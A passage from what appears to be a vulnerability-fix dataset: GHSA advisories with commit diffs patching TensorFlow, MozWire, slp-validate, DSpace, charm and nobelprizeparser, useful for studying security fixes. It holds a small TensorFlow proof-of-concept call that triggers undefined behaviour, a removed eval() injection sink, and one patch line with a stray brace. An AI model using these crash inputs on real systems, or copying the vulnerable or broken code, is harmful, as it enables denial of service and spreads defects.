guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution \nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/b12aa1d44352de21d1a6faaf04172d8c2508b42b","commit_sha":"b12aa1d44352de21d1a6faaf04172d8c2508b42b","patch":"SINGLE","chain_ord":"['b12aa1d44352de21d1a6faaf04172d8c2508b42b']","before_first_fix_commit":"{'988087bd83f144af14087fe4fecee2d250d93737'}","last_fix_commit":"b12aa1d44352de21d1a6faaf04172d8c2508b42b","chain_ord_pos":1.0,"commit_datetime":"04\/20\/2021, 01:32:56","message":"Fix one more FPE.\n\nPiperOrigin-RevId: 369346568\nChange-Id: I840fd575962adc879713a4c9cc59e6da3331caa7","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 13, 'deletions': 0, 'total': 13}","files":"{'tensorflow\/core\/kernels\/conv_ops.cc': {'additions': 13, 'deletions': 0, 'changes': 13, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/b12aa1d44352de21d1a6faaf04172d8c2508b42b\/tensorflow%2Fcore%2Fkernels%2Fconv_ops.cc', 'patch': '@@ -260,6 +260,11 @@ struct LaunchConv2DOp<CPUDevice, T> {\\n     const int64 out_depth = output->dim_size(3);\\n     const int64 patch_depth = filter.dim_size(2);\\n \\n+    if (patch_depth <= 0) {\\n+      ctx->SetStatus(errors::InvalidArgument(\\n+          \"filter depth must be stricly positive, got \", patch_depth));\\n+      return;\\n+    }\\n     if (in_depth % patch_depth != 0) {\\n       ctx->SetStatus(errors::InvalidArgument(\\n           \"input depth must be evenly divisible by filter depth: \", in_depth,\\n@@ -268,6 +273,11 @@ struct LaunchConv2DOp<CPUDevice, T> {\\n     }\\n \\n     const int64 num_groups = in_depth \/ patch_depth;\\n+    if (num_groups <= 0) {\\n+      ctx->SetStatus(errors::InvalidArgument(\\n+          \"number of groups must be stricly positive, got \", num_groups));\\n+      return;\\n+    }\\n     if (out_depth % num_groups != 0 || out_depth < num_groups) {\\n       ctx->SetStatus(errors::InvalidArgument(\\n           \"output depth must be evenly divisible by number of groups: \",\\n@@ -536,6 +546,9 @@ Status ComputeConv2DDimension(const Conv2DParameters& params,\\n               errors::InvalidArgument(\"Patch depth too large\"));\\n   const int in_depth = static_cast<int>(in_depth_raw);\\n   const int patch_depth = static_cast<int>(patch_depth_raw);\\n+  TF_REQUIRES(patch_depth > 0,\\n+              errors::InvalidArgument(\\n+                  \"filter depth must be stricly positive, got \", patch_depth));\\n   TF_REQUIRES(in_depth % patch_depth == 0,\\n               errors::InvalidArgument(\\n                   \"input depth must be evenly divisible by filter depth: \",'}}","message_norm":"fix one more fpe.\n\npiperorigin-revid: 369346568\nchange-id: i840fd575962adc879713a4c9cc59e6da3331caa7","language":"it","entities":"[('fix', 'ACTION', ''), ('fpe', 'SECWORD', ''), ('369346568', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/conv_ops.cc'])","num_files":1.0},{"index":496,"vuln_id":"GHSA-4vhw-4rw7-jfpv","cwe_id":"{'CWE-22'}","score":9.1,"chain":"{'https:\/\/github.com\/NilsIrl\/MozWire\/pull\/17\/commits\/dd0639bf2876773b66382f47285f7db701f628d9'}","dataset":"osv","summary":"Path traversal in mozwire An issue was discovered in the mozwire crate through 2020-08-18 for Rust. A ..\/ directory-traversal situation allows overwriting local files that have .conf at the end of the filename.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/NilsIrl\/MozWire","commit_href":"https:\/\/github.com\/NilsIrl\/MozWire\/pull\/17\/commits\/dd0639bf2876773b66382f47285f7db701f628d9","commit_sha":"dd0639bf2876773b66382f47285f7db701f628d9","patch":"SINGLE","chain_ord":"['dd0639bf2876773b66382f47285f7db701f628d9']","before_first_fix_commit":"{'1e58d8ba41268b36232e6830808565850ec65587'}","last_fix_commit":"dd0639bf2876773b66382f47285f7db701f628d9","chain_ord_pos":1.0,"commit_datetime":"08\/18\/2020, 19:05:11","message":"Validate server hostnames to prevent path traversal\n\nIf Mozilla servers were compromised, hostnames could be used for path\ntraversal attacks. The impact would be very low as it would only be\npossible to write wireguard configs.\n\nFix #14","author":"Nils","comments":null,"stats":"{'additions': 23, 'deletions': 2, 'total': 25}","files":"{'src\/main.rs': {'additions': 23, 'deletions': 2, 'changes': 25, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/NilsIrl\/MozWire\/raw\/dd0639bf2876773b66382f47285f7db701f628d9\/src%2Fmain.rs', 'patch': '@@ -106,6 +106,14 @@ struct Server {\\n     port_ranges: Vec<(u16, u16)>,\\n }\\n \\n+impl Server {\\n+    fn validate_hostname(&self) -> bool {\\n+        self.hostname\\n+            .chars()\\n+            .all(|c| c.is_ascii_alphanumeric() || c == \\'-\\')\\n+    }\\n+}\\n+\\n \/\/ latitude and longitude omitted\\n #[derive(serde::Deserialize)]\\n struct City {\\n@@ -130,13 +138,26 @@ struct ServerList {\\n \\n impl ServerList {\\n     fn new(client: reqwest::blocking::Client, token: &str) -> Self {\\n-        client\\n+        let server_list = client\\n             .get(&format!(\"{}\/vpn\/servers\", BASE_URL))\\n             .bearer_auth(token)\\n             .send()\\n             .unwrap()\\n             .json::<ServerList>()\\n-            .unwrap()\\n+            .unwrap();\\n+        if let Some(server) = server_list\\n+            .countries\\n+            .iter()\\n+            .flat_map(|country| country.cities.iter().flat_map(|city| city.servers.iter()))\\n+            .find(|server| !server.validate_hostname())\\n+        {\\n+            eprintln!(\\n+                \"A server contains invalid characters in its hostname: {}\",\\n+                server.hostname\\n+            );\\n+            std::process::exit(3);\\n+        }\\n+        server_list\\n     }\\n }'}}","message_norm":"validate server hostnames to prevent path traversal\n\nif mozilla servers were compromised, hostnames could be used for path\ntraversal attacks. the impact would be very low as it would only be\npossible to write wireguard configs.\n\nfix #14","language":"en","entities":"[('validate', 'ACTION', ''), ('server', 'SECWORD', ''), ('prevent', 'ACTION', ''), ('path traversal', 'SECWORD', ''), ('servers', 'SECWORD', ''), ('attacks', 'SECWORD', ''), ('low', 'SEVERITY', ''), ('fix', 'ACTION', ''), ('#14', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/main.rs'])","num_files":1.0},{"index":498,"vuln_id":"GHSA-4vrf-ff7v-hpgr","cwe_id":"{'CWE-369'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/f61c57bd425878be108ec787f4d96390579fb83e'}","dataset":"osv","summary":"Division by zero in TFLite's implementation of `EmbeddingLookup` The implementation of the `EmbeddingLookup` TFLite operator is [vulnerable to a division by zero error](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/e4b29809543b250bc9b19678ec4776299dd569ba\/tensorflow\/lite\/kernels\/embedding_lookup.cc#L73-L74):\n\n```cc\nconst int row_size = SizeOfDimension(value, 0);\nconst int row_bytes = value->bytes \/ row_size;\n```\n\nAn attacker can craft a model such that the first dimension of the `value` input is 0.\n\n### Patches\nWe have patched the issue in GitHub commit [f61c57bd425878be108ec787f4d96390579fb83e](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/f61c57bd425878be108ec787f4d96390579fb83e).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/f61c57bd425878be108ec787f4d96390579fb83e","commit_sha":"f61c57bd425878be108ec787f4d96390579fb83e","patch":"SINGLE","chain_ord":"['f61c57bd425878be108ec787f4d96390579fb83e']","before_first_fix_commit":"{'e4b29809543b250bc9b19678ec4776299dd569ba'}","last_fix_commit":"f61c57bd425878be108ec787f4d96390579fb83e","chain_ord_pos":1.0,"commit_datetime":"04\/28\/2021, 19:57:00","message":"Prevent division by 0\n\nPiperOrigin-RevId: 370966645\nChange-Id: I831bfd96c7eb77b02d7ebb744335f59f6e5728cb","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 4, 'deletions': 0, 'total': 4}","files":"{'tensorflow\/lite\/kernels\/embedding_lookup.cc': {'additions': 4, 'deletions': 0, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/f61c57bd425878be108ec787f4d96390579fb83e\/tensorflow%2Flite%2Fkernels%2Fembedding_lookup.cc', 'patch': '@@ -71,6 +71,10 @@ TfLiteStatus EvalSimple(TfLiteContext* context, TfLiteNode* node,\\n                         const TfLiteTensor* lookup, const TfLiteTensor* value,\\n                         TfLiteTensor* output) {\\n   const int row_size = SizeOfDimension(value, 0);\\n+  if (row_size == 0) {\\n+    \/\/ Propagate empty tensor if input is empty\\n+    return kTfLiteOk;\\n+  }\\n   const int row_bytes = value->bytes \/ row_size;\\n \\n   char* output_raw = GetTensorData<char>(output);'}}","message_norm":"prevent division by 0\n\npiperorigin-revid: 370966645\nchange-id: i831bfd96c7eb77b02d7ebb744335f59f6e5728cb","language":"en","entities":"[('prevent', 'ACTION', ''), ('division by 0', 'SECWORD', ''), ('370966645', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/lite\/kernels\/embedding_lookup.cc'])","num_files":1.0},{"index":513,"vuln_id":"GHSA-4w97-57v2-3w44","cwe_id":"{'CWE-697'}","score":8.6,"chain":"{'https:\/\/github.com\/simpleledger\/slp-validate\/commit\/cde95c0c6470dceb4f023cd462f904135ebd73e7'}","dataset":"osv","summary":"False-negative validation results in MINT transactions with invalid baton ### Impact\nUsers could experience false-negative validation outcomes for [MINT](https:\/\/github.com\/simpleledger\/slp-specifications\/blob\/master\/slp-token-type-1.md#mint---extended-minting-transaction) transaction operations.  A poorly implemented SLP wallet could allow spending of the affected tokens which would result in the destruction of a user's minting baton.\n\n### Patches\nnpm package [slp-validate](https:\/\/www.npmjs.com\/package\/slp-validate) has been patched and published as version 1.2.1.\n\n### Workarounds\nUpgrade to slp-validate 1.2.1.\n\n### References\n* slp-validate [commit](https:\/\/github.com\/simpleledger\/slp-validate\/commit\/cde95c0c6470dceb4f023cd462f904135ebd73e7)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [slp-validate](https:\/\/github.com\/simpleledger\/slp-validate\/issues)","published_date":"2020-05-12","chain_len":1,"project":"https:\/\/github.com\/simpleledger\/slp-validate","commit_href":"https:\/\/github.com\/simpleledger\/slp-validate\/commit\/cde95c0c6470dceb4f023cd462f904135ebd73e7","commit_sha":"cde95c0c6470dceb4f023cd462f904135ebd73e7","patch":"SINGLE","chain_ord":"['cde95c0c6470dceb4f023cd462f904135ebd73e7']","before_first_fix_commit":"{'4ca5ea8556bfacdaa6c81f0c3151a23e728cb8b6'}","last_fix_commit":"cde95c0c6470dceb4f023cd462f904135ebd73e7","chain_ord_pos":1.0,"commit_datetime":"04\/29\/2020, 13:52:56","message":"fix false negative case for MINT transactions\n\nSee the newly added unit test case for this issue.\nCurrently there are 151 unit tests.","author":"James Cramer","comments":null,"stats":"{'additions': 10, 'deletions': 6, 'total': 16}","files":"{'lib\/validation.ts': {'additions': 10, 'deletions': 6, 'changes': 16, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/simpleledger\/slp-validate.js\/raw\/cde95c0c6470dceb4f023cd462f904135ebd73e7\/lib%2Fvalidation.ts', 'patch': '@@ -408,10 +408,10 @@ export class ValidatorType1 {\\n                     }\\n                 } catch (_) { }\\n             }\\n-            if (validation.parents.length !== 1) {\\n+            if (validation.parents.length < 1) {\\n                 validation.validity = false;\\n                 validation.waiting = false;\\n-                validation.invalidReason = \"MINT transaction must have 1 valid baton parent.\";\\n+                validation.invalidReason = \"MINT transaction must have at least 1 candidate baton parent input.\";\\n                 return validation.validity!;\\n             }\\n         } else if (slpmsg.transactionType === SlpTransactionType.SEND) {\\n@@ -468,10 +468,14 @@ export class ValidatorType1 {\\n         \/\/ Set validity validation-cache for parents, and handle MINT condition with no valid input\\n         \/\/ we don\\'t need to check proper token id since we only added parents with same ID in above steps.\\n         const parentTxids = [...new Set(validation.parents.map(p => p.txid))];\\n-        for (let i = 0; i < parentTxids.length; i++) {\\n-            const valid = await this.isValidSlpTxid({ txid: parentTxids[i] });\\n-            validation.parents.filter(p => p.txid === parentTxids[i]).map(p => p.valid = valid);\\n-            if (validation.details!.transactionType === SlpTransactionType.MINT && !valid) {\\n+        for (const id of parentTxids) {\\n+            const valid = await this.isValidSlpTxid({ txid: id });\\n+            validation.parents.filter(p => p.txid === id).map(p => p.valid = valid);\\n+        }\\n+\\n+        \/\/ Check MINT for exactly 1 valid MINT baton\\n+        if (validation.details!.transactionType === SlpTransactionType.MINT) {\\n+            if (validation.parents.filter(p => p.valid && p.inputQty === null).length !== 1) {\\n                 validation.validity = false;\\n                 validation.waiting = false;\\n                 validation.invalidReason = \"MINT transaction with invalid baton parent.\";'}}","message_norm":"fix false negative case for mint transactions\n\nsee the newly added unit test case for this issue.\ncurrently there are 151 unit tests.","language":"en","entities":"[('fix', 'ACTION', ''), ('added', 'ACTION', ''), ('issue', 'FLAW', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/validation.ts'])","num_files":1.0},{"index":517,"vuln_id":"GHSA-4wm8-c2vv-xrpq","cwe_id":"{'CWE-79'}","score":7.1,"chain":"{'https:\/\/github.com\/DSpace\/DSpace\/commit\/28eb8158210d41168a62ed5f9e044f754513bc37', 'https:\/\/github.com\/DSpace\/DSpace\/commit\/f7758457b7ec3489d525e39aa753cc70809d9ad9'}","dataset":"osv","summary":"JSPUI Possible Cross Site Scripting in \"Request a Copy\" Feature ### Impact\nThe JSPUI \"Request a Copy\" feature does not properly escape values submitted and stored from the \"Request a Copy\" form.  This means that item requests could be vulnerable to XSS attacks.  This vulnerability only impacts the JSPUI.\n\n_This vulnerability does NOT impact the XMLUI or 7.x._\n\n### Patches\n\n_DSpace 6.x:_ \n* Fixed in 6.4 via commit: https:\/\/github.com\/DSpace\/DSpace\/commit\/503a6af57fd720c37b0d86c34de63baa5dd85819\n* 6.x patch file: https:\/\/github.com\/DSpace\/DSpace\/commit\/503a6af57fd720c37b0d86c34de63baa5dd85819.patch (may be applied manually if an immediate upgrade to 6.4 is not possible)\n\n_DSpace 5.x:_\n* Fixed in 5.11 via commit: https:\/\/github.com\/DSpace\/DSpace\/commit\/28eb8158210d41168a62ed5f9e044f754513bc37\n* 5.x patch file: https:\/\/github.com\/DSpace\/DSpace\/commit\/28eb8158210d41168a62ed5f9e044f754513bc37.patch (may be applied manually if an immediate upgrade to 5.11 or 6.4 is not possible)\n\n#### Apply the patch to your DSpace\nIf at all possible, we recommend upgrading your DSpace site based on the upgrade instructions. However, if you are unable to do so, you can manually apply the above patches as follows:\n1. Download the appropriate patch file to the machine where DSpace is running\n2. From the `[dspace-src]` folder, apply the patch, e.g. `git apply [name-of-file].patch`\n3. Now, update your DSpace site (based loosely on the Upgrade instructions). This generally involves three steps:\n    1. Rebuild DSpace, e.g. `mvn -U clean package`  (This will recompile all DSpace code)\n    2. Redeploy DSpace, e.g. `ant update`  (This will copy all updated WARs \/ configs to your installation directory). Depending on your setup you also may need to copy the updated WARs over to your Tomcat webapps folder.\n    3. Restart Tomcat\n\n### Workarounds\nAs a workaround, you can temporarily disable the \"Request a Copy\" feature by either commenting out the below configuration (or setting its value to empty):\n```\n# Comment out this default value\n# request.item.type = all\n```\nOnce your JSPUI site is patched, you can re-enable this setting. See https:\/\/wiki.lyrasis.org\/display\/DSDOC6x\/Request+a+Copy for more information on this setting.\n\n### References\nDiscovered & reported by Andrea Bollini of 4Science\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at security@dspace.org","published_date":"2022-08-06","chain_len":2,"project":"https:\/\/github.com\/DSpace\/DSpace","commit_href":"https:\/\/github.com\/DSpace\/DSpace\/commit\/f7758457b7ec3489d525e39aa753cc70809d9ad9","commit_sha":"f7758457b7ec3489d525e39aa753cc70809d9ad9","patch":"MULTI","chain_ord":"['f7758457b7ec3489d525e39aa753cc70809d9ad9', '28eb8158210d41168a62ed5f9e044f754513bc37']","before_first_fix_commit":"{'56e76049185bbd87c994128a9d77735ad7af0199'}","last_fix_commit":"28eb8158210d41168a62ed5f9e044f754513bc37","chain_ord_pos":1.0,"commit_datetime":"04\/08\/2020, 00:48:56","message":"[DS-4133] Improve URL handling in Controlled Vocab JSPUI servlet","author":"Kim Shepherd","comments":null,"stats":"{'additions': 10, 'deletions': 2, 'total': 12}","files":"{'dspace-jspui\/src\/main\/java\/org\/dspace\/app\/webui\/servlet\/ControlledVocabularyServlet.java': {'additions': 10, 'deletions': 2, 'changes': 12, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/DSpace\/DSpace\/raw\/f7758457b7ec3489d525e39aa753cc70809d9ad9\/dspace-jspui%2Fsrc%2Fmain%2Fjava%2Forg%2Fdspace%2Fapp%2Fwebui%2Fservlet%2FControlledVocabularyServlet.java', 'patch': '@@ -14,6 +14,7 @@\\n import javax.servlet.http.HttpServletRequest;\\n import javax.servlet.http.HttpServletResponse;\\n \\n+import org.apache.log4j.Logger;\\n import org.dspace.authorize.AuthorizeException;\\n import org.dspace.core.Context;\\n \\n@@ -25,8 +26,8 @@\\n  *\/\\n public class ControlledVocabularyServlet extends DSpaceServlet\\n {\\n-    \/\/ private static Logger log =\\n-    \/\/ Logger.getLogger(ControlledVocabularyServlet.class);\\n+    private static Logger log =\\n+    Logger.getLogger(ControlledVocabularyServlet.class);\\n \\n     protected void doDSGet(Context context, HttpServletRequest request,\\n             HttpServletResponse response) throws ServletException, IOException,\\n@@ -37,6 +38,13 @@ protected void doDSGet(Context context, HttpServletRequest request,\\n         String filter = \"\";\\n         String callerUrl = request.getParameter(\"callerUrl\");\\n \\n+        \/\/ callerUrl must starts with URL outside DSpace request context path\\n+        if(!callerUrl.startsWith(request.getContextPath())) {\\n+            log.error(\"Controlled vocabulary caller URL would result in redirect outside DSpace web app: \" + callerUrl + \". Rejecting request with 400 Bad Request.\");\\n+            response.sendError(400, \"The caller URL must be within the DSpace base URL of \" + request.getContextPath());\\n+            return;\\n+        }\\n+\\n         if (request.getParameter(\"ID\") != null)\\n         {\\n             ID = request.getParameter(\"ID\");'}}","message_norm":"[ds-4133] improve url handling in controlled vocab jspui servlet","language":"en","entities":"[('improve', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['dspace-jspui\/src\/main\/java\/org\/dspace\/app\/webui\/servlet\/ControlledVocabularyServlet.java'])","num_files":1.0},{"index":518,"vuln_id":"GHSA-4wpp-w5r4-7v5v","cwe_id":"{'CWE-918'}","score":9.8,"chain":"{'https:\/\/github.com\/charmbracelet\/charm\/commit\/3c90668f955c7ce5ef721e4fc9faee7053232fd3'}","dataset":"osv","summary":"Server-Side Request Forgery in charm We've discovered a vulnerability in which attackers could forge HTTP requests to manipulate the `charm` data directory to access or delete anything on the server. This has been patched in https:\/\/github.com\/charmbracelet\/charm\/commit\/3c90668f955c7ce5ef721e4fc9faee7053232fd3 and is available in release [v0.12.1](https:\/\/github.com\/charmbracelet\/charm\/releases\/tag\/v0.12.1). We recommend that all users running self-hosted `charm` instances update immediately.\n\nThis vulnerability was found in-house and we haven't been notified of any potential exploiters.\n\n### Additional notes\n\n* Encrypted user data uploaded to the Charm server is safe as Charm servers cannot decrypt user data. This includes filenames, paths, and all key-value data.\n* Users running the official Charm [Docker images](https:\/\/github.com\/charmbracelet\/charm\/blob\/main\/docker.md) are at minimal risk because the exploit is limited to the containerized filesystem.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open a [discussion](https:\/\/github.com\/charmbracelet\/charm\/discussions)\n* Email us at [vt100@charm.sh](mailto:vt100@charm.sh)\n* Chat with us on [Slack](https:\/\/charm.sh\/slack)\n\n* * *\n\n<a href=\"https:\/\/charm.sh\/\"><img alt=\"the Charm logo\" src=\"https:\/\/stuff.charm.sh\/charm-badge.jpg\" width=\"400\"><\/a>\n\nCharm\u70ed\u7231\u5f00\u6e90 \u2022 Charm loves open source","published_date":"2022-05-24","chain_len":1,"project":"https:\/\/github.com\/charmbracelet\/charm","commit_href":"https:\/\/github.com\/charmbracelet\/charm\/commit\/3c90668f955c7ce5ef721e4fc9faee7053232fd3","commit_sha":"3c90668f955c7ce5ef721e4fc9faee7053232fd3","patch":"SINGLE","chain_ord":"['3c90668f955c7ce5ef721e4fc9faee7053232fd3']","before_first_fix_commit":"{'9c620ae07e7f7d7f3c0f6e52166b8b5f899d55d1'}","last_fix_commit":"3c90668f955c7ce5ef721e4fc9faee7053232fd3","chain_ord_pos":1.0,"commit_datetime":"05\/06\/2022, 01:23:14","message":"fix: clean path before accessing file store","author":"Christian Muehlhaeuser","comments":null,"stats":"{'additions': 4, 'deletions': 3, 'total': 7}","files":"{'server\/http.go': {'additions': 4, 'deletions': 3, 'changes': 7, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/charmbracelet\/charm\/raw\/3c90668f955c7ce5ef721e4fc9faee7053232fd3\/server%2Fhttp.go', 'patch': '@@ -10,6 +10,7 @@ import (\\n \\t\"io\/ioutil\"\\n \\t\"log\"\\n \\t\"net\/http\"\\n+\\t\"path\/filepath\"\\n \\t\"strconv\"\\n \\t\"strings\"\\n \\n@@ -279,7 +280,7 @@ func (s *HTTPServer) handlePostSeq(w http.ResponseWriter, r *http.Request) {\\n \\n func (s *HTTPServer) handlePostFile(w http.ResponseWriter, r *http.Request) {\\n \\tu := s.charmUserFromRequest(w, r)\\n-\\tpath := pattern.Path(r.Context())\\n+\\tpath := filepath.Clean(pattern.Path(r.Context()))\\n \\tms := r.URL.Query().Get(\"mode\")\\n \\tm, err := strconv.ParseUint(ms, 10, 32)\\n \\tif err != nil {\\n@@ -316,7 +317,7 @@ func (s *HTTPServer) handlePostFile(w http.ResponseWriter, r *http.Request) {\\n \\n func (s *HTTPServer) handleGetFile(w http.ResponseWriter, r *http.Request) {\\n \\tu := s.charmUserFromRequest(w, r)\\n-\\tpath := pattern.Path(r.Context())\\n+\\tpath := filepath.Clean(pattern.Path(r.Context()))\\n \\tf, err := s.cfg.FileStore.Get(u.CharmID, path)\\n \\tif errors.Is(err, fs.ErrNotExist) {\\n \\t\\ts.renderCustomError(w, \"file not found\", http.StatusNotFound)\\n@@ -353,7 +354,7 @@ func (s *HTTPServer) handleGetFile(w http.ResponseWriter, r *http.Request) {\\n \\n func (s *HTTPServer) handleDeleteFile(w http.ResponseWriter, r *http.Request) {\\n \\tu := s.charmUserFromRequest(w, r)\\n-\\tpath := pattern.Path(r.Context())\\n+\\tpath := filepath.Clean(pattern.Path(r.Context()))\\n \\terr := s.cfg.FileStore.Delete(u.CharmID, path)\\n \\tif err != nil {\\n \\t\\tlog.Printf(\"cannot delete file: %s\", err)'}}","message_norm":"fix: clean path before accessing file store","language":"en","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['server\/http.go'])","num_files":1.0},{"index":519,"vuln_id":"GHSA-4wv4-mgfq-598v","cwe_id":"{'CWE-94'}","score":0.0,"chain":"{'https:\/\/github.com\/AnneTheDev\/nobelprize\/commit\/00639d375b0efd097bc1eca18d9dc021691b9286'}","dataset":"osv","summary":"Code injection in nobelprizeparser Code injection through use of eval.","published_date":"2021-03-12","chain_len":1,"project":"https:\/\/github.com\/AnneTheDev\/nobelprize","commit_href":"https:\/\/github.com\/AnneTheDev\/nobelprize\/commit\/00639d375b0efd097bc1eca18d9dc021691b9286","commit_sha":"00639d375b0efd097bc1eca18d9dc021691b9286","patch":"SINGLE","chain_ord":"['00639d375b0efd097bc1eca18d9dc021691b9286']","before_first_fix_commit":"{'23abc78c8bf9eddce8ec40f0ec7bbb586a3ebe9f', '29126617df6f313d81588d695d94982cba03d82e'}","last_fix_commit":"00639d375b0efd097bc1eca18d9dc021691b9286","chain_ord_pos":1.0,"commit_datetime":"02\/23\/2021, 09:03:46","message":"Merge pull request from GHSA-4wv4-mgfq-598v\n\nReplace eval with JSON.parse","author":"AnneTheDev","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'lib\/index.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/AnneTheDev\/nobelprize\/raw\/00639d375b0efd097bc1eca18d9dc021691b9286\/lib%2Findex.js', 'patch': '@@ -10,7 +10,7 @@ function output(laureate) {\\n class Parser {\\n     \/\/ Parse JSON data\\n     constructor(data) {\\n-        this.laureates = eval(`(${data})`).laureates;\\n+        this.laureates = JSON.parse(data}).laureates;\\n     }\\n \\n     inYear(year) {'}}","message_norm":"merge pull request from ghsa-4wv4-mgfq-598v\n\nreplace eval with json.parse","language":"en","entities":"[('ghsa-4wv4-mgfq-598v', 'VULNID', 'GHSA'), ('eval', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/index.js'])","num_files":1.0},{"index":525,"vuln_id":"GHSA-4xfp-4pfp-89wg","cwe_id":"{'CWE-824'}","score":7.1,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/1071f554dbd09f7e101324d366eec5f4fe5a3ece'}","dataset":"osv","summary":"Reference binding to nullptr in `RaggedTensorToSparse` ### Impact\nAn attacker can cause undefined behavior via binding a reference to null pointer in `tf.raw_ops.RaggedTensorToSparse`:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.RaggedTensorToSparse(\n  rt_nested_splits=[[0, 38, 0]],\n  rt_dense_values=[])\n```\n  \nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/f24faa153ad31a4b51578f8181d3aaab77a1ddeb\/tensorflow\/core\/kernels\/ragged_tensor_to_sparse_kernel.cc#L30) has an incomplete validation of the splits values: it does not check that they are in increasing order.\n\n### Patches\nWe have patched the issue in GitHub commit [1071f554dbd09f7e101324d366eec5f4fe5a3ece](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/1071f554dbd09f7e101324d366eec5f4fe5a3ece).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information \nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/1071f554dbd09f7e101324d366eec5f4fe5a3ece","commit_sha":"1071f554dbd09f7e101324d366eec5f4fe5a3ece","patch":"SINGLE","chain_ord":"['1071f554dbd09f7e101324d366eec5f4fe5a3ece']","before_first_fix_commit":"{'0f387ffa5cc7d30fa1574d12f875ffbb2d1826b4'}","last_fix_commit":"1071f554dbd09f7e101324d366eec5f4fe5a3ece","chain_ord_pos":1.0,"commit_datetime":"07\/30\/2021, 01:23:29","message":"Add missing validation to `RaggedTensorToSparse`.\n\nThere needs to be a check that the splits allow for valid ragged tensors.\n\nPiperOrigin-RevId: 387712169\nChange-Id: I2499175324b82b65d159a260c7f83b98ceb5cc7d","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 11, 'deletions': 1, 'total': 12}","files":"{'tensorflow\/core\/kernels\/ragged_tensor_to_sparse_kernel.cc': {'additions': 11, 'deletions': 1, 'changes': 12, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/1071f554dbd09f7e101324d366eec5f4fe5a3ece\/tensorflow%2Fcore%2Fkernels%2Fragged_tensor_to_sparse_kernel.cc', 'patch': '@@ -21,6 +21,7 @@ limitations under the License.\\n #include \"tensorflow\/core\/framework\/register_types.h\"\\n #include \"tensorflow\/core\/framework\/tensor.h\"\\n #include \"tensorflow\/core\/framework\/tensor_shape.h\"\\n+#include \"tensorflow\/core\/platform\/errors.h\"\\n \\n namespace tensorflow {\\n \\n@@ -38,7 +39,8 @@ class RaggedTensorToSparseOp : public OpKernel {\\n     OP_REQUIRES_OK(\\n         context, context->input_list(\"rt_nested_splits\", &rt_nested_splits_in));\\n     const int rt_nested_splits_len = rt_nested_splits_in.size();\\n-    DCHECK_GT(rt_nested_splits_len, 0);  \/\/ Enforced by REGISTER_OP.\\n+    OP_REQUIRES(context, rt_nested_splits_len > 0,\\n+                errors::InvalidArgument(\"rt_nested_splits must be non empty\"));\\n     std::vector<ConstFlatSplits> rt_nested_splits;\\n     rt_nested_splits.reserve(rt_nested_splits_len);\\n     for (int i = 0; i < rt_nested_splits_len; ++i) {\\n@@ -162,6 +164,14 @@ class RaggedTensorToSparseOp : public OpKernel {\\n       if (rt_nested_splits[i](0) != 0) {\\n         return InvalidArgument(\"First value of ragged splits must be 0.\");\\n       }\\n+      for (int j = 1; j < rt_nested_splits[i].size(); ++j) {\\n+        if (rt_nested_splits[i](j) < rt_nested_splits[i](j - 1)) {\\n+          return 